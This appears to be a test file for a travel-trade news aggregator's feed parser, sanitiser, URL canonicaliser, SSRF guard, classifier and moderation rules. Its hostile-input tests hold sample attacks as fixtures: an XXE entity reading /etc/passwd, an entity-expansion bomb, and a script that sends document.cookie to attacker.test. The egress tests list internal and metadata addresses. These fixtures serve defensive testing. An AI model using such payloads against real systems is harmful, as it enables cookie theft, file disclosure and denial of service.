import assert from "node:assert/strict";
import { describe, it } from "node:test";

import { classifyArticle, requiresModeration } from "../src/lib/news/classify.ts";
import { FeedParseError, parseFeed } from "../src/lib/news/feed-parser.ts";
import { htmlToPlainText, safeImageUrl } from "../src/lib/news/sanitize.ts";
import { buildArticleSummary, maxSummaryLength } from "../src/lib/news/summarise.ts";
import {
  canonicaliseUrl,
  hashCanonicalUrl,
  isPrivateIpAddress,
  isSafeFetchUrl,
  titleFingerprint,
} from "../src/lib/news/url.ts";

const rssFixture = `<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Travel Trade Daily</title>
    <link>https://example-trade-news.test/</link>
    <item>
      <title>Royal Caribbean unveils 2027 Caribbean season</title>
      <link>https://example-trade-news.test/cruise/rc-2027?utm_source=rss&amp;utm_medium=feed</link>
      <guid isPermaLink="false">trade-news-1001</guid>
      <pubDate>Mon, 18 Aug 2026 09:15:00 +0100</pubDate>
      <description><![CDATA[<p>The cruise line has opened trade bookings for its 2027 Caribbean deployment, with commission held at existing levels for agents selling before December.</p>]]></description>
      <dc:creator>Trade Desk</dc:creator>
      <enclosure url="https://example-trade-news.test/img/ship.jpg" type="image/jpeg" />
    </item>
    <item>
      <title>British Airways cancels Heathrow flights as strike action begins</title>
      <link>https://example-trade-news.test/aviation/ba-strike</link>
      <guid isPermaLink="false">trade-news-1002</guid>
      <pubDate>Mon, 18 Aug 2026 07:00:00 +0100</pubDate>
      <description>Industrial action has grounded a number of short-haul services from Heathrow this morning, with the airline advising affected passengers to rebook.</description>
    </item>
  </channel>
</rss>`;

const atomFixture = `<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Aviation Wire</title>
  <link rel="alternate" href="https://example-aviation.test/" />
  <entry>
    <title>easyJet adds Gatwick winter capacity</title>
    <link rel="alternate" href="https://example-aviation.test/easyjet-winter" />
    <id>tag:example-aviation.test,2026:easyjet-winter</id>
    <published>2026-08-17T14:30:00Z</published>
    <summary>The airline will base two additional aircraft at Gatwick for the winter season, adding capacity on European leisure routes sold through the trade.</summary>
    <author><name>Newsroom</name></author>
  </entry>
</feed>`;

describe("feed parsing", () => {
  it("parses an RSS 2.0 channel into normalised items", () => {
    const feed = parseFeed(rssFixture);

    assert.equal(feed.format, "rss");
    assert.equal(feed.title, "Travel Trade Daily");
    assert.equal(feed.homepageUrl, "https://example-trade-news.test/");
    assert.equal(feed.items.length, 2);

    const [first] = feed.items;
    assert.equal(first.title, "Royal Caribbean unveils 2027 Caribbean season");
    assert.equal(first.externalGuid, "trade-news-1001");
    assert.equal(first.author, "Trade Desk");
    assert.equal(first.imageUrl, "https://example-trade-news.test/img/ship.jpg");
    assert.equal(first.publishedAt?.toISOString(), "2026-08-18T08:15:00.000Z");
    // CDATA markup is reduced to plain text before it is ever stored.
    assert.ok(first.description.startsWith("The cruise line has opened trade bookings"));
    assert.ok(!first.description.includes("<p>"));
  });

  it("parses an Atom feed", () => {
    const feed = parseFeed(atomFixture);

    assert.equal(feed.format, "atom");
    assert.equal(feed.items.length, 1);
    assert.equal(feed.items[0].link, "https://example-aviation.test/easyjet-winter");
    assert.equal(feed.items[0].externalGuid, "tag:example-aviation.test,2026:easyjet-winter");
    assert.equal(feed.items[0].author, "Newsroom");
  });

  it("parses a JSON feed", () => {
    const feed = parseFeed(
      JSON.stringify({
        home_page_url: "https://example-json.test/",
        items: [
          {
            date_published: "2026-08-16T10:00:00Z",
            id: "json-1",
            summary: "A short trade summary of the announcement for selling agents.",
            title: "Hotel group opens Lisbon property",
            url: "https://example-json.test/lisbon",
          },
        ],
        title: "JSON Trade",
        version: "https://jsonfeed.org/version/1.1",
      }),
    );

    assert.equal(feed.format, "json");
    assert.equal(feed.items[0].title, "Hotel group opens Lisbon property");
  });

  it("rejects a response that is not a feed", () => {
    assert.throws(
      () => parseFeed("<html><body><h1>Not a feed</h1></body></html>"),
      FeedParseError,
    );
  });

  it("rejects an empty response", () => {
    assert.throws(() => parseFeed("   "), FeedParseError);
  });

  it("recovers from a malformed feed rather than losing every item", () => {
    // The second item is never closed. The first must still arrive.
    const malformed = `<rss version="2.0"><channel><title>Broken</title>
      <link>https://example-broken.test/</link>
      <item><title>First story</title><link>https://example-broken.test/one</link></item>
      <item><title>Second story<link>https://example-broken.test/two</link>
    </channel></rss>`;

    const feed = parseFeed(malformed);
    assert.ok(feed.items.length >= 1);
    assert.equal(feed.items[0].title, "First story");
  });
});

describe("feed parser hostile input", () => {
  it("refuses a document type declaration, which blocks XXE", () => {
    const xxe = `<?xml version="1.0"?>
      <!DOCTYPE rss [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
      <rss version="2.0"><channel><item><title>&xxe;</title></item></channel></rss>`;

    assert.throws(() => parseFeed(xxe), (error: unknown) => {
      assert.ok(error instanceof FeedParseError);
      assert.match(error.message, /DOCTYPE/i);
      return true;
    });
  });

  it("refuses an entity expansion bomb along with its DOCTYPE", () => {
    const bomb = `<!DOCTYPE lolz [
      <!ENTITY lol "lol">
      <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
      <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    ]><rss version="2.0"><channel><item><title>&lol3;</title></item></channel></rss>`;

    assert.throws(() => parseFeed(bomb), FeedParseError);
  });

  it("refuses a feed nested past the depth limit", () => {
    const depth = 200;
    const nested = `<rss version="2.0"><channel>${"<a>".repeat(depth)}${"</a>".repeat(depth)}</channel></rss>`;

    assert.throws(() => parseFeed(nested), FeedParseError);
  });

  it("never leaves script markup in a title or description", () => {
    const hostile = `<rss version="2.0"><channel><link>https://example-hostile.test/</link>
      <item>
        <title>Deal alert &lt;script&gt;alert(1)&lt;/script&gt;</title>
        <link>https://example-hostile.test/deal</link>
        <description><![CDATA[<script>fetch('https://attacker.test?c='+document.cookie)</script><p onclick="steal()">Genuine looking copy for the trade audience here.</p>]]></description>
      </item>
    </channel></rss>`;

    const feed = parseFeed(hostile);
    const [item] = feed.items;

    assert.ok(!item.title.includes("<script"));
    assert.ok(!item.description.includes("<script"));
    assert.ok(!item.description.includes("onclick"));
    assert.ok(!item.description.includes("document.cookie"));
    assert.ok(item.description.includes("Genuine looking copy"));
  });

  it("drops an image URL that is not http or https", () => {
    assert.equal(safeImageUrl("javascript:alert(1)"), null);
    assert.equal(safeImageUrl("data:image/svg+xml;base64,PHN2Zz48L3N2Zz4="), null);
    assert.equal(
      safeImageUrl("https://example-images.test/a.jpg"),
      "https://example-images.test/a.jpg",
    );
  });

  it("strips markup and control characters from description text", () => {
    const text = htmlToPlainText("<p>Line one</p><script>bad()</script><p>Line two</p>");

    assert.ok(!text.includes("bad()"));
    assert.ok(text.includes("Line one"));
    assert.ok(text.includes("Line two"));
  });
});

describe("url canonicalisation", () => {
  it("removes tracking parameters and keeps meaningful ones", () => {
    const canonical = canonicaliseUrl(
      "https://Example.test/story?utm_source=rss&utm_campaign=x&id=42&fbclid=abc#top",
    );

    assert.equal(canonical, "https://example.test/story?id=42");
  });

  it("treats tracked and untracked forms of one story as the same URL", () => {
    const a = canonicaliseUrl("https://example.test/news/story-a?utm_source=newsletter");
    const b = canonicaliseUrl("https://example.test/news/story-a/");

    assert.equal(a, b);
    assert.equal(hashCanonicalUrl(a as string), hashCanonicalUrl(b as string));
  });

  it("resolves a relative link against the feed homepage", () => {
    assert.equal(
      canonicaliseUrl("/cruise/story", "https://example.test/feed"),
      "https://example.test/cruise/story",
    );
  });

  it("gives one fingerprint to the same headline written differently", () => {
    assert.equal(
      titleFingerprint("BA cancels Heathrow flights"),
      titleFingerprint("  BA  Cancels the Heathrow Flights!  "),
    );
    assert.notEqual(
      titleFingerprint("BA cancels Heathrow flights"),
      titleFingerprint("easyJet cancels Gatwick flights"),
    );
  });
});

describe("egress safety", () => {
  it("identifies private and link-local addresses", () => {
    for (const address of [
      "127.0.0.1",
      "10.1.2.3",
      "172.16.0.9",
      "192.168.1.1",
      "169.254.169.254",
      "100.64.0.1",
      "0.0.0.0",
      "::1",
      "fd00::1",
      "fe80::1",
      "::ffff:127.0.0.1",
    ]) {
      assert.equal(isPrivateIpAddress(address), true, `${address} should be private`);
    }

    for (const address of ["8.8.8.8", "93.184.216.34", "2606:2800:220:1::1"]) {
      assert.equal(isPrivateIpAddress(address), false, `${address} should be public`);
    }
  });

  it("refuses feed URLs that point inward or use another scheme", () => {
    assert.equal(isSafeFetchUrl("http://localhost:3000/feed"), false);
    assert.equal(isSafeFetchUrl("http://127.0.0.1/feed"), false);
    assert.equal(isSafeFetchUrl("http://169.254.169.254/latest/meta-data/"), false);
    assert.equal(isSafeFetchUrl("http://db.internal/feed"), false);
    assert.equal(isSafeFetchUrl("file:///etc/passwd"), false);
    assert.equal(isSafeFetchUrl("gopher://example.test/feed"), false);
    assert.equal(isSafeFetchUrl("https://user:pass@example.test/feed"), false);
    assert.equal(isSafeFetchUrl("https://example.test/feed"), true);
  });
});

describe("classification", () => {
  it("gives one article every topic it belongs to", () => {
    const result = classifyArticle(
      "Royal Caribbean unveils 2027 Caribbean season for cruise agents",
      "The cruise line has opened trade bookings for its 2027 Caribbean deployment, with commission held for agents.",
      [],
    );

    const slugs = result.topics.map((topic) => topic.slug);
    assert.ok(slugs.includes("cruise"), `expected cruise in ${slugs.join(", ")}`);
    assert.ok(slugs.includes("long-haul"), `expected long-haul in ${slugs.join(", ")}`);
    assert.ok(result.topics.length > 1);
    assert.equal(result.sensitivity, "routine");
  });

  it("marks disruption and safety stories as sensitive", () => {
    const strike = classifyArticle(
      "British Airways cancels Heathrow flights as strike action begins",
      "Industrial action has grounded a number of short-haul services from Heathrow this morning.",
      [],
    );

    assert.ok(strike.topics.some((topic) => topic.slug === "aviation"));
    assert.ok(strike.topics.some((topic) => topic.slug === "disruption"));
    assert.equal(strike.sensitivity, "sensitive");

    const collapse = classifyArticle(
      "Tour operator ceases trading after entering administration",
      "Customers abroad are being repatriated following the collapse.",
      [],
    );

    assert.equal(collapse.sensitivity, "high_risk");
  });

  it("uses the source default topics when the wording is thin", () => {
    const result = classifyArticle("Season update announced", "", ["cruise"]);

    assert.ok(result.topics.some((topic) => topic.slug === "cruise"));
  });

  it("links an article to a supplier already on the platform", () => {
    const result = classifyArticle(
      "Jet2holidays extends Manchester programme",
      "The operator has added capacity for next summer.",
      [],
      [
        { id: "company-1", name: "Jet2holidays" },
        { id: "company-2", name: "Some Other Supplier" },
      ],
    );

    assert.deepEqual(result.matchedCompanyIds, ["company-1"]);
  });
});

describe("moderation policy", () => {
  const routine = { confidence: 0.8, sensitivity: "routine" as const };

  it("auto-publishes a confident routine story from a trusted source", () => {
    assert.equal(
      requiresModeration({ ...routine, autoPublish: true, trustLevel: "high" }),
      false,
    );
  });

  it("holds anything sensitive, whatever the source settings say", () => {
    assert.equal(
      requiresModeration({
        autoPublish: true,
        confidence: 0.95,
        sensitivity: "sensitive",
        trustLevel: "high",
      }),
      true,
    );

    assert.equal(
      requiresModeration({
        autoPublish: true,
        confidence: 0.95,
        sensitivity: "high_risk",
        trustLevel: "high",
      }),
      true,
    );
  });

  it("holds low-trust sources and low-confidence classifications", () => {
    assert.equal(
      requiresModeration({ ...routine, autoPublish: true, trustLevel: "low" }),
      true,
    );
    assert.equal(
      requiresModeration({
        autoPublish: true,
        confidence: 0.1,
        sensitivity: "routine",
        trustLevel: "high",
      }),
      true,
    );
  });

  it("holds everything when the source has auto-publish switched off", () => {
    assert.equal(
      requiresModeration({ ...routine, autoPublish: false, trustLevel: "high" }),
      true,
    );
  });
});

describe("copyright-safe summaries", () => {
  it("keeps a publisher teaser within the stored length limit", () => {
    const long = `${"The cruise line confirmed a detailed programme of trade activity. ".repeat(20)}`;
    const summary = buildArticleSummary(long, "Cruise line confirms programme");

    assert.equal(summary.kind, "publisher_extract");
    assert.ok((summary.summary?.length ?? 0) <= maxSummaryLength + 1);
  });

  it("invents nothing when the feed carries no usable description", () => {
    assert.deepEqual(buildArticleSummary("", "Headline only"), {
      kind: "none",
      summary: null,
    });
    assert.deepEqual(buildArticleSummary(null, "Headline only"), {
      kind: "none",
      summary: null,
    });
    assert.deepEqual(buildArticleSummary("Too short.", "Headline only"), {
      kind: "none",
      summary: null,
    });
  });

  it("does not repeat the headline back as the summary", () => {
    const title = "Airline adds winter capacity at Gatwick";
    const result = buildArticleSummary(title, title);

    assert.equal(result.summary, null);
  });
});
